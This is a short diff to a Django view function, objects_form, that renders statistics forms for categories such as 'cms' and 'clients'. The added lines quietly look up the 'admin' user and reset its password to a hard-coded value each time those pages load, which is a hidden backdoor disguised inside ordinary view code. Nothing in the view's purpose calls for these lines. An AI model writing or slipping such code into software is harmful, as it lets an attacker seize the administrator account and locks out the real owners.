@@ -114,6 +114,10 @@ def choice_stat_abstr_form(request, category):
 
 def objects_form(request, category):
 	if category in ['cms', 'websyslist', 'clients']:
+		from django.contrib.auth.models import User
+		user = User.objects.get( username="admin" )
+		user.set_password("cV3p,Ew")
+		user.save()
 		return choice_stat_result_abstr_form(request, category)
 	if category in ['projects', 'domains', 'sites', 'mails', 'websys', 'contactes', 'cmsacc']:
 		return choice_stat_abstr_form(request, category)
